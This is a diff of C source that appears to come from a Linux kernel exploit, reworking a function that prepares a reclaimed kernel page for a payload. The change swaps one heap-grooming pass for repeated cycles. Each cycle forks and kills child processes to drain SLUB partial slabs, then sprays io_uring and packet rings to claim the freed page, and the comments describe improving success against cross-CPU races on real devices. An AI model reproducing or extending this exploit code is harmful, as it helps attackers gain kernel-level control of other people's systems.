@@ -1988,49 +1988,45 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
 
   /*
-   * FINAL TURNOVER (the missing piece): even after all closes/kills,
-   * base's page survives as a stuck SLUB partial (QEMU before_rings:
-   * self-linked lru, slabs=10 remain: cpu_partial=3 + node=5 + active).
-   * Frozen partials never discard on their own. Fork enough holders to
-   * consume EVERY free object on EVERY surviving partial slab (incl.
-   * base's page — allocations from cpu-partial pages are served), then
-   * kill them all: the pages empty and discard. Rings follow.
+   * RECLAIM CYCLES (reliability): repeat [holder turnover + payload ring
+   * burst]. Even after all closes/kills, base's page can survive as a
+   * stuck SLUB partial (QEMU before_rings: self-linked lru; frozen
+   * partials never discard on their own). Each cycle's fork wave consumes
+   * free objects on surviving partial slabs (incl. base's page) and the
+   * kills cycle them to discard; the ring burst then claims the freshest
+   * order-2 frees. Failed cycles are FREE (no walk yet) — extra cycles
+   * only add re-rolls against cross-CPU races (device ~1/3 → QEMU-smp8
+   * reproduces the variance).
    */
   {
-    int waves = env_int_range("FINAL_TURNOVER", 224, 0, 1024);
-    if (waves > 0) {
-      pid_t *tids = calloc((size_t)waves, sizeof(pid_t));
-      int n = 0;
-      for (int i = 0; i < waves; i++) {
-        tids[i] = clone_child();
-        if (tids[i] > 0)
-          n++;
+    int cycles = env_int_range("RECLAIM_CYCLES", 3, 1, 8);
+    int per_cycle = env_int_range("FINAL_TURNOVER", 224, 0, 1024) / cycles;
+    for (int c = 0; c < cycles; c++) {
+      if (per_cycle > 0) {
+        pid_t *tids = calloc((size_t)per_cycle, sizeof(pid_t));
+        int n = 0;
+        for (int i = 0; i < per_cycle; i++) {
+          tids[i] = clone_child();
+          if (tids[i] > 0)
+            n++;
+        }
+        for (int i = 0; i < n; i++) {
+          kill_child(tids[i]);
+        }
+        free(tids);
+        sched_yield();
+        sched_yield();
       }
-      for (int i = 0; i < n; i++) {
-        kill_child(tids[i]);
+      slab_state_snap("before_rings");
+      if (c == 0 && env_flag("RSP_HALT2", 0)) {
+        pr_info("RSP_HALT2: halting before rings\n");
+        rsp_halt_after_closes();
       }
-      free(tids);
-      sched_yield();
-      sched_yield();
-      pr_info("FINAL_TURNOVER: %d holders cycled\n", n);
+      iouring_ring_reclaim(skb_buf, 0x500);
+      packet_ring_reclaim(skb_buf, 0x500);
+      pr_info("RECLAIM_CYCLE %d/%d done\n", c + 1, cycles);
     }
   }
-
-  /*
-   * RINGS LAST (the restructure): every mm reference is now closed and
-   * every holder killed — base's page has discarded (late path) and sits
-   * at/near the head of the freshest order-2 frees. The immediate tight
-   * io_uring burst claims it while nothing else intervenes; packet rings
-   * follow (QEMU/caps), then the caller's skb sends are already done —
-   * they run before this point but only as backup.
-   */
-  slab_state_snap("before_rings");
-  if (env_flag("RSP_HALT2", 0)) {
-    pr_info("RSP_HALT2: halting before rings\n");
-    rsp_halt_after_closes();
-  }
-  iouring_ring_reclaim(skb_buf, 0x500);
-  packet_ring_reclaim(skb_buf, 0x500);
 
   return base;
 }
